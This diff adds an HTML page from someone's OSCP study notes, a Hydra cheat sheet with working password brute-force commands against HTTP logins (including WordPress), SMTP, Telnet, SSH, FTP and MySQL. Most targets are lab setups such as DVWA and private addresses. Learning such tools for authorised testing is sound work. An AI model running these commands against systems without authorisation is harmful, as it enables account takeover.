@@ -1,0 +1,416 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Hydra Cheat Sheet - Brandon&#x27;s OSCP Notes</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><div><strong aria-hidden="true">1.</strong> The Things</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Quick Notes.html"><strong aria-hidden="true">1.1.</strong> Quick Notes</a></li><li class="chapter-item expanded "><a href="Scanning.html"><strong aria-hidden="true">1.2.</strong> Scanning</a></li><li class="chapter-item expanded "><a href="File Transfer.html"><strong aria-hidden="true">1.3.</strong> File Transfer</a></li><li class="chapter-item expanded "><a href="Ports.html"><strong aria-hidden="true">1.4.</strong> Ports</a></li><li class="chapter-item expanded "><a href="Shells.html"><strong aria-hidden="true">1.5.</strong> Shells</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Gaining Access</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="CrackMapExecCheatSheet.html"><strong aria-hidden="true">2.1.</strong> CrackMapExec Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Web Shells.html"><strong aria-hidden="true">2.2.</strong> Web Shells</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.3.</strong> Password Cracking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="My Hashcat Cheatsheet.html"><strong aria-hidden="true">2.3.1.</strong> Hashcat Cheat Sheet</a></li><li class="chapter-item expanded "><a href="My Hydra Cheatsheet.html" class="active"><strong aria-hidden="true">2.3.2.</strong> Hydra Cheat Sheet</a></li><li class="chapter-item expanded "><a href="Bruteforce.html"><strong aria-hidden="true">2.3.3.</strong> Bruteforce</a></li></ol></li><li class="chapter-item expanded "><a href="Buffer Overflow.html"><strong aria-hidden="true">2.4.</strong> Buffer Overflow</a></li><li class="chapter-item expanded "><a href="File Uploads.html"><strong aria-hidden="true">2.5.</strong> File Uploads</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="htmlfileupload.html"><strong aria-hidden="true">2.5.1.</strong> HTML</a></li><li class="chapter-item expanded "><a href="MyMacros.html"><strong aria-hidden="true">2.5.2.</strong> Macro</a></li><li class="chapter-item expanded "><a href="OLEFileUpload.html"><strong aria-hidden="true">2.5.3.</strong> OLE</a></li></ol></li><li class="chapter-item expanded "><a href="LFIRFI.html"><strong aria-hidden="true">2.6.</strong> LFI/RFI</a></li><li class="chapter-item expanded "><a href="ShellShock.html"><strong aria-hidden="true">2.7.</strong> Shell Shock</a></li><li class="chapter-item expanded "><a href="Github.html"><strong aria-hidden="true">2.8.</strong> Github</a></li><li class="chapter-item expanded "><a href="MySQL.html"><strong aria-hidden="true">2.9.</strong> SQL</a></li><li class="chapter-item expanded "><a href="WindowLibraries.html"><strong aria-hidden="true">2.10.</strong> Windows Libraries and APIs</a></li><li class="chapter-item expanded "><a href="XXEXSSDeSerial.html"><strong aria-hidden="true">2.11.</strong> XXE_XSS_Deserialization</a></li><li class="chapter-item expanded "><a href="DirectoryTraveral.html"><strong aria-hidden="true">2.12.</strong> Directory Traversal</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Linux PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="LinuxEnum.html"><strong aria-hidden="true">3.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="LinuxPrivExploit.html"><strong aria-hidden="true">3.2.</strong> Exploit</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Windows PrivEsc</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WinPrivEnum.html"><strong aria-hidden="true">4.1.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="WinPrivExploit.html"><strong aria-hidden="true">4.2.</strong> Exploit</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Active Directory</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="WeGotUsersbutnoPass.html"><strong aria-hidden="true">5.1.</strong> We got Users but no Pass?</a></li><li class="chapter-item expanded "><a href="ADEnum.html"><strong aria-hidden="true">5.2.</strong> Enumeration</a></li><li class="chapter-item expanded "><a href="ADAuth.html"><strong aria-hidden="true">5.3.</strong> Authentication</a></li><li class="chapter-item expanded "><a href="ADPivoting.html"><strong aria-hidden="true">5.4.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="ADLateralMovement.html"><strong aria-hidden="true">5.5.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="ADHashDump.html"><strong aria-hidden="true">5.6.</strong> Hash Dumping</a></li><li class="chapter-item expanded "><a href="ADPersistence.html"><strong aria-hidden="true">5.7.</strong> Persistence</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Brandon&#x27;s OSCP Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="hydra-notes"><a class="header" href="#hydra-notes">Hydra notes</a></h1>
+<p>https://medium.com/@joshthedev/step-10-login-brute-forcing-e709b4b60637</p>
+<p>Hydra is a very useful software when it comes to bruteforce credentials on most commonly used protocols. We are going to start with some flags which are generally used independently from the protocol, so in the examples when we will see these flags, we can immediately understand what they are used for. Here is a list of common and general flags used with Hydra:</p>
+<ul>
+<li><code>-L &lt;filepath&gt;</code> for the file path to use for usernames, separated by newlines</li>
+<li><code>-P &lt;filepath&gt;</code> for the file path to use for passwords, separated by newlines</li>
+<li><code>-C &lt;filepath&gt;</code> this is an alternative to -L and -P, since we can provide a unique file which contains both user and password, separated by a colon, like user1:passwdrandom user2:minestrone root:toor ...</li>
+<li><code>-t &lt;integer&gt;</code> is the number of threads to use</li>
+<li><code>-o &lt;filepath&gt;</code> allows us to specify an output file where to save results</li>
+<li><code>-w &lt;integer&gt;</code> specifies the amount of seconds two wait between consecutive requests</li>
+<li><code>-s &lt;integer&gt;</code> specifies the port number to use</li>
+<li><code>-v</code> activates the verbose mode, to give us an idea of what is happening behind the scenes, so we will see each attempt, and the current combination of credentials which is being tested</li>
+<li><code>-S</code> performs a connection using SSL</li>
+<li><code>-l &lt;username&gt;</code> uses a single user for login instead of a list/file, so we can specify instead of -L a single user with <code>-l root</code> or <code>-l usrname1</code></li>
+<li><code>-M &lt;filepath&gt;</code> with this option we can specify a file which will contain on each line a different IP or website or resource, in order to perform parallel cracking</li>
+<li><code>-f</code> this flag when activated, will let hydra terminate as soon as it finds a single correct credential pair, so as soon as it succeeds it exits, this happens per host if we specify -M (so a set of machines)</li>
+<li><code>-F</code> exits after the first found login/password pair for any host (for usage with -M)</li>
+</ul>
+<h2 id="http"><a class="header" href="#http"><a href="https://github.com/gnebbia/hydra_notes#http"></a>HTTP</a></h2>
+<h3 id="http-basic-authentication"><a class="header" href="#http-basic-authentication"><a href="https://github.com/gnebbia/hydra_notes#http-basic-authentication"></a>HTTP Basic Authentication</a></h3>
+<p>We can use the following commands for Basic HTTP Authentication, we can understand that the authentication is basic from the headers of the response.</p>
+<pre><code class="language-shell">hydra -L users.txt -P words.txt www.site.com http-head /private/
+# we provide users.txt as files containing users
+# then words.txt as the password file and then we try
+# a basic http authentication by using the http-head parameter
+# then we provide the page /private/ which is the url path
+# where we are asked for credentials
+</code></pre>
+<p>We can add with -e combinations to the already existing combinations provided from the users and password files in particular we can use <code>n</code> or <code>s</code> or <code>r</code> or all the combinations of them, their meaning is:</p>
+<ul>
+<li><code>n</code> adds for each user also the null password</li>
+<li><code>s</code> adds the combination of credentials username/username for each of the usernames</li>
+<li><code>r</code> adds for each combination username/password also the reversed password/username</li>
+</ul>
+<pre><code class="language-shell">hydra -L users.txt -P words.txt www.site.com -e ns http-head /private/
+# here we do the same thing as before, but we add combinations with
+# `-e ns`, so we are also trying with an empty password for each
+# of the users and with passwords equal to the username for each user
+</code></pre>
+<h3 id="http-digest-authentication"><a class="header" href="#http-digest-authentication"><a href="https://github.com/gnebbia/hydra_notes#http-digest-authentication"></a>HTTP Digest Authentication</a></h3>
+<pre><code class="language-shell">hydra -l root -P test.txt -vV localhost http-get /forbidden-d2
+# uses the username root with passwords from the file called test.txt
+# it runs in verbose mode on localhost through http-get module we specify
+# that this is an HTTP digest authentication found at path /forbidden-d2
+</code></pre>
+<pre><code class="language-shell">hydra -l admin -P 1000_common_passwords.txt -s 8090 -f 192.168.1.4 http-get /get_camera_params.cgi
+# uses the username admin with passwords from the file called
+# 1000_common_passwords.txt it runs on port 8090 through 
+# the -f flag it will stop as soon as it finds the first valid credentials
+# the http-get module is specified to denote the presence of an HTTP digest
+# authentication at the path /get_camera_params.cgi
+</code></pre>
+<h3 id="http-forms"><a class="header" href="#http-forms"><a href="https://github.com/gnebbia/hydra_notes#http-forms"></a>HTTP Forms</a></h3>
+<p>When it comes to HTTP login forms, we generally have to inspect the web application, searching for messages which will appear on successful or failed logins.</p>
+<p>Generally for HTTP forms we will have hydra commands with the following structure:</p>
+<pre><code class="language-shell">hydra -L &lt;users_file&gt; -P &lt;password_file&gt; &lt;url&gt; http[s]-[post|get]-form \
+"index.php:param1=value1&amp;param2=value2&amp;user=^USER^&amp;pwd=^PASS^&amp;paramn=valn:[F|S]=messageshowed"
+</code></pre>
+<p>Where depending on the webpage and on the post we can have after url:</p>
+<ul>
+<li>http-get-form, in case of an http page with a get form</li>
+<li>https-get-form, in case of an https page with a get form</li>
+<li>http-post-form, in case of an http page with a post form</li>
+<li>https-post-form, in case of an https page with a post form</li>
+</ul>
+<p>and after this a string we specify the "request string" which will contain the following elements separated by a colon <code>:</code>:</p>
+<ul>
+<li>pageOnWhichTheLoginHappens</li>
+<li>list of parameters, here we have to specify with ^USER^ and ^PASS^ where usernames and passwords will be inserted</li>
+<li>a character which may be F (for failing strings) or S for successful strings followed by an equal sign <code>=</code> and a string which appears in a failed attempt or in a successful attempt, if we do not specify F or S, F is the default also because this is the more natural option, we generally know which strings will appear when we fail a login but not the ones which will appear when it is successful (unless we are dealing with a known web technology/framework). Let's see some examples, We can specify a failure string with <code>:F=mystringincaseoffailure</code> while we can specify a success string with <code>:S=mystringincaseofsuccess</code>. But we may also see online <code>:mystring</code> and it will be the equivalent of <code>:F=mystring</code></li>
+</ul>
+<p>Let's see some warmup examples:</p>
+<pre><code class="language-shell">hydra -l admin -P pass.txt https://url.com https-post-form "index.php:param1=value123&amp;user=^USER^&amp;pass=^PASS^:F=Bad login"
+ # in this example we are in an https post form situation, 
+ # as we may notice as request line we have the following structure
+ # page:parameters:F=message_to_show_in_case_of_failure
+</code></pre>
+<pre><code class="language-shell">hydra -l admin -P pass.txt https://url.com https-post-form "index.php:param1=value123&amp;user=^USER^&amp;pass=^PASS^:S=Success!!"
+ # in this example we are in an https post form situation, 
+ # as we may notice as request line we have the following structure
+ # page:parameters:S=message_to_show_in_case_of_failure
+</code></pre>
+<h3 id="http-get-login-forms"><a class="header" href="#http-get-login-forms"><a href="https://github.com/gnebbia/hydra_notes#http-get-login-forms"></a>HTTP Get Login Forms</a></h3>
+<pre><code class="language-shell">hydra -l admin -P /root/Desktop/wordlists/test.txt http://www.website.com \
+http-get-form "/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect."
+</code></pre>
+<pre><code class="language-shell">hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt -P /usr/share/seclists/Passwords/rockyou-40.txt \
+  -e ns  -F  -u  -t 1  -w 10  -v  -V  192.168.1.44  http-get-form \
+"/DVWA/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
+</code></pre>
+<h3 id="http-post-login-forms"><a class="header" href="#http-post-login-forms"><a href="https://github.com/gnebbia/hydra_notes#http-post-login-forms"></a>HTTP Post Login Forms</a></h3>
+<pre><code class="language-shell">hydra 192.168.1.69 http-post-form "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&amp;pass=^PASS^:Bad login" \
+-L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
+# Here we specified:
+ # Host = 192.168.1.69
+ # Method = http-form-post
+ # URL = /w3af/bruteforce/form_login/dataReceptor.php
+ # Form parameters = user=^USER^&amp;pass=^PASS^
+ # Failure response = Bad login
+ # Users file = users.txt
+ # Password file = pass.txt
+ # Threads = -t 10
+ # Wait for timeout = -w 30
+ # Output file = -o hydra-http-post-attack.txt
+</code></pre>
+<p>We can make more complicated examples, for example by specifying specific headers or cookies with:</p>
+<pre><code class="language-shell">hydra 192.168.1.69 http-post-form "/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H=X-Foo: Foo" \
+-L users.txt -P pass.txt -t 10 -w 1 -o hydra-http-post-attack.txt
+ # in this case we specify that the cookie should be page/cookie
+ # cookies can be specified with C=
+ # and we also added an header with H= 
+ # this header is called X-Foo and has as value Foo
+</code></pre>
+<pre><code class="language-shell">hydra -L users.txt -P words.txt https://www.site.com  https-post-form "/index.cgi:login&amp;name=^USER^&amp;password=^PASS^&amp;login=Login:Not allowed" &amp;
+ # here we use https-post-form, since the website uses https
+</code></pre>
+<pre><code class="language-shell">hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location'
+# now we check for success by using S=Location, since wordpress uses a Location
+# header to redirect the user, we can think about S as a sort of grep applied to
+# the HTTP response
+</code></pre>
+<h2 id="smtp"><a class="header" href="#smtp"><a href="https://github.com/gnebbia/hydra_notes#smtp"></a>SMTP</a></h2>
+<pre><code class="language-shell">hydra smtp.victimsemailserver.com smtp -l useraccount@gmail.com -P '/root/Desktop/rockyou.txt' -s portnumber -S -v 
+</code></pre>
+<p>Generally the port used for SMTP is 465 and common SMTP server for common email services are: * smtp.mail.yahoo.com * smtp.gmail.com * smtp.live.com (but on poort 587)</p>
+<h2 id="telnet"><a class="header" href="#telnet"><a href="https://github.com/gnebbia/hydra_notes#telnet"></a>Telnet</a></h2>
+<pre><code class="language-shell">hydra -l &lt;username&gt; -P &lt;password_file&gt; telnet://targetname
+</code></pre>
+<h2 id="ssh"><a class="header" href="#ssh"><a href="https://github.com/gnebbia/hydra_notes#ssh"></a>SSH</a></h2>
+<pre><code class="language-shell">hydra -l root -M /path/to/ip/list.txt -P /path/to/passwordlist.txt ssh -t 4
+</code></pre>
+<p>Notice that with some services, we may need to use the recommended number of tasks. In case of SSH if we use more than 4 tasks we may get errors.</p>
+<pre><code class="language-shell">hydra 192.168.1.26 ssh2 -s 22 -P pass.txt -L users.txt -e ns -t 10
+ # this will attack the system 192.168.1.26 on port 22
+ # and will use as password file pass.txt while
+ # for users the file users.txt
+ # the process will use 10 threads at a time
+</code></pre>
+<pre><code class="language-shell">hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123
+</code></pre>
+<pre><code class="language-shell">hydra -L logins.txt -P pws.txt -M targets.txt ssh
+# tries the users from logins.txt and the paasswords from pws.txt
+# on all the machines listed on targests.txt on the ssh port/service
+</code></pre>
+<h2 id="ftp"><a class="header" href="#ftp"><a href="https://github.com/gnebbia/hydra_notes#ftp"></a>FTP</a></h2>
+<pre><code class="language-shell">hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ftp
+</code></pre>
+<pre><code class="language-shell">hydra -l user -P passlist.txt ftp://192.168.0.1
+</code></pre>
+<h2 id="mysql-and-other-databases"><a class="header" href="#mysql-and-other-databases"><a href="https://github.com/gnebbia/hydra_notes#mysql-and-other-databases"></a>MySQL and other databases</a></h2>
+<p>We can use hydra with many kinds of databases, anyway it is very important for us to check that we have installed hydra with the adequate module to perform a specific bruteforce.</p>
+<p><strong>IMPORTANT</strong>: if we did not install hydra with mysql5 support it will not work, we can check the modules available by issuing a <code>hydra -h</code>, if we just see <code>mysql(v4)</code> this means that our version will not be compatible with <code>mysql5</code>, while if we see <code>mysql</code> then our version of hydra will be compatible also with mysql5 databases.</p>
+<pre><code class="language-shell">hydra -L &lt;your_username_file&gt; -P &lt;your_password_file&gt; &lt;IP&gt; mysql -s 3306 -o output.txt
+</code></pre>
+<p>notice that this is equivalent to:</p>
+<pre><code class="language-shell">hydra -L &lt;your_username_file&gt; -P &lt;your_password_file&gt; &lt;IP&gt; mysql -o output.txt
+ # by default mysql uses port 3306 so we do not need to specify it,
+ # anyway it is fundamental to specify it if the mysql port is different
+</code></pre>
+<h2 id="appendix-a-sending-hydra-traffic-through-proxy"><a class="header" href="#appendix-a-sending-hydra-traffic-through-proxy"><a href="https://github.com/gnebbia/hydra_notes#appendix-a-sending-hydra-traffic-through-proxy"></a>Appendix A: Sending Hydra traffic through Proxy</a></h2>
+<p>It is often useful to analyze what we are actually doing with hydra, to this purpose we can send the traffic to an intercepting proxy such as Burp.</p>
+<p>To do this, we just have to set an environment variable:</p>
+<pre><code class="language-shell">export HYDRA_PROXY=http://127.0.0.1:8080
+# or
+export HYDRA_PROXY_HTTP=http://127.0.0.1:8080 
+</code></pre>
+<p>From <code>hydra -v</code> we can indeed read:</p>
+<pre><code class="language-shell">Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
+E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
+     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
+     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
+     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="My Hashcat Cheatsheet.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="Bruteforce.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="My Hashcat Cheatsheet.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="Bruteforce.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
